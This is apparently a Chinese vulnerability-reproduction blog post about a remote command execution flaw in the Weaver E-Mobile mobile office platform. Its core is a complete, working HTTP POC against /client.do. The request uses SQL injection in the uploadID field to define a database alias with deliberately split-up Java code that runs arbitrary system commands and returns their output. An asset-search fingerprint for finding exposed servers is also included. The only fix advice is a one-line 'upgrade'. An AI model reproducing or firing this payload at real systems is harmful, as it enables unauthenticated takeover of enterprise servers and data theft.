---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  泛微E-Mobile 远程命令执行漏洞（RCE）附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-28 02:04  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
# 泛微E-Mobile 远程命令执行漏洞  
  
  
#   
  
  
02  
  
—  
  
影响版本  
  
泛微E-Mobile移动管理平台多个版本，部分漏洞影响版本为2024.3前  
  
版本，部分涉及E-Mobile 6.0等版本。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJ6Dn2bxuZnGiaNzXB5M1j7L3UBMhxiboY8SSqVdvbyy8prLd4icALILqbkaPhtFywmp7af3qdko63Vw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
泛微e-Mobile移动管理平台是上海泛微网络科技股份有限公司推出的一款移动办公平台  
，旨在帮助企业构建以员工为核心的移动  
统一办公平台。它将企业ERP、CRM、OA  
等各类系统应用融合在一个平台，覆盖组织管理、业务、财务等各方面，通过统一组织、统一消息、统一应用、统一搜索、统一报表等功能，实现信息聚合与高效协  
同。  
攻击者可利用漏洞绕过身份验证，执行任意系统命令，获取服务器控制权，可能导致数据泄露、系统被控、植入后门等严重后果。  
  
  
04  
  
—  
  
资产测绘  
```
"Weaver E-Mobile"                    
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJ6Dn2bxuZnGiaNzXB5M1j7LdAo39sS6qxt5N8IibeJsXJlM1LGRN41wJnkJWxKRN4UvoDrOV6JoHLw/640?wx_fmt=png&from=appmsg "")  
  
    
  
05  
  
—  
  
漏洞复现  
  
POC  
```
POST /client.do HTTP/1.1
Host:  127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=abcrCRF1rJkt_4V8s_ikz; ecology_JSessionid=abcrCRF1rJkt_4V8s_ikz; testBanCookie=test; Systemlanguid=7
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyBvZrAkWyCD8dThV
Content-Length: 1131
------WebKitFormBoundaryyBvZrAkWyCD8dThV
Content-Disposition: form-data; name="method"
getupload
------WebKitFormBoundaryyBvZrAkWyCD8dThV
Content-Disposition: form-data; name="uploadID"
1';CREATE ALIAS if not exists abcd AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL abcd('whoami');--
------WebKitFormBoundaryyBvZrAkWyCD8dThV--
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJ6Dn2bxuZnGiaNzXB5M1j7L4X7ibz3AJgWtK9ibxJmWcbneRib8qVLvW5nwmZYiapCy4oZpiasHWxg71ibQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJ6Dn2bxuZnGiaNzXB5M1j7LReeQ6RtdGiahGVkwVZ3ibFRmoFRlxVDW6RoLicMgjmv9tUzN3CJN3xK1Q/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
